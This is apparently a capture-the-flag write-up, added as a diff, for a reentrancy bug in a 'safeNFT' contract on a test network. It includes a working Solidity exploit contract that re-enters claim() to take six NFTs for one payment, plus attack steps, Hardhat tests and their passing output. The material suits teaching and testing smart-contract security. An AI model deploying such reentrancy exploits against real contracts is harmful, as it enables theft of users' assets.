@@ -1,0 +1,106 @@
+Exploit transaction: https://goerli.etherscan.io/tx/0x05b5ba1b59726042834140949df36e2ea040555945c7cf0a66b24821b6a879b4
+
+The exploit smart contract:
+
+// Put the safeNFT contract here to run in remix.
+contract ExploitSafeNFT is IERC721Receiver {
+    safeNFT public target;
+    uint256 public totalSupplySafeNFT;
+
+    constructor(address _targetAddress) {
+        target = safeNFT(_targetAddress);
+    }
+
+    function attack() external payable {
+        require(msg.value == 0.01 ether, "Need 0.01 ether to proceed!!!");
+        target.buyNFT{value: msg.value}();
+        totalSupplySafeNFT = target.totalSupply();
+        target.claim();
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+        // To claim multiple NFTs
+        if (tokenId < totalSupplySafeNFT + 5) {
+            target.claim();
+        }
+        // Need to stop reentrancy at some time or the transaction will fail
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    // Just a helper function for you to take out your "spoils of war"
+    function redeemNFTs(address _to, uint256[] calldata _tokenIds) external {
+        for (uint256 i = 0; i < _tokenIds.length; i++) {
+            target.transferFrom(address(this), _to, _tokenIds[i]);
+        }
+    }
+}
+
+
+Vulnerability:
+The claim() function of safeNFT contract has the reentrancy vulnerability. 
+A reentrancy attack in Solidity repeatedly withdraws funds/assets from a 
+smart contract and transfers them to an unauthorized contract until the 
+funds/assets have been exhausted.
+
+Objective:
+Claim multiple NFTs for the price of one.
+
+Attack steps:
+1. Make the explot contract as an ERC721 reciever using IERC721Receiver 
+interface from OpenZeppelin.
+
+2. Next in our attack() function we will buy an NFT at 0.01 ether price and 
+claim it using the claim() method of safeNFT contract.
+
+3. Next in our onERC721Received() function we will again call the claim()
+method of safeNFT contract. This will be able to claim the NFT again and 
+again until we give a stop condition.
+
+4. In our exploit the stop condition is the totalSupply at the time of 
+buying NFT + 5. This will help us claim 6 NFTs for the price of 1.
+
+4. Now, this was possible because when the contract will recieve any NFT 
+it will automatically call the onERC721Received() function.
+
+
+Test cases for the exploit:
+const { expect } = require("chai");
+const { BigNumber } = require("ethers");
+const { ethers } = require("hardhat");
+
+describe("Exploit safeNFT Contract", function () {
+    before(async () => {
+        // deploying the target contract
+        const SafeNFT = await ethers.getContractFactory("safeNFT");
+        safeNFT_contract = await SafeNFT.deploy('safeNFT', 'sNFT', ethers.utils.parseEther('0.01'));
+    })
+    it("Exploiter deploys the ExploitSafeNFT contract and calls the attack() function", async () => {
+        // Deploying the ExploitSafeNFT contract
+        const Exploit = await ethers.getContractFactory("ExploitSafeNFT");
+        exploit_contract = await Exploit.deploy(safeNFT_contract.address);
+        // Attack the safeNFT contract by calling the attack function with 0.01 eth value
+        await exploit_contract.attack({ value: ethers.utils.parseEther('0.01') });
+    })
+    it('Attack should be successful: Exploiter contract should have claimed multiple NFTs', async () => {
+        const exploiter_contract_bal = await safeNFT_contract.balanceOf(exploit_contract.address);
+        // Exploiter contract should have claimed 6 NFTs for the price of 1
+        expect(exploiter_contract_bal).to.equal(BigNumber.from('6'));
+    })
+});
+
+
+Output for test cases:
+❯ npx hardhat test test/SafeNFTCTF.test.js 
+
+
+  Exploit safeNFT Contract
+    ✔ Exploiter deploys the ExploitSafeNFT contract and calls the attack() function (59ms)
+    ✔ Attack should be successful: Exploiter contract should have claimed multiple NFTs
+
+
+  2 passing (686ms)
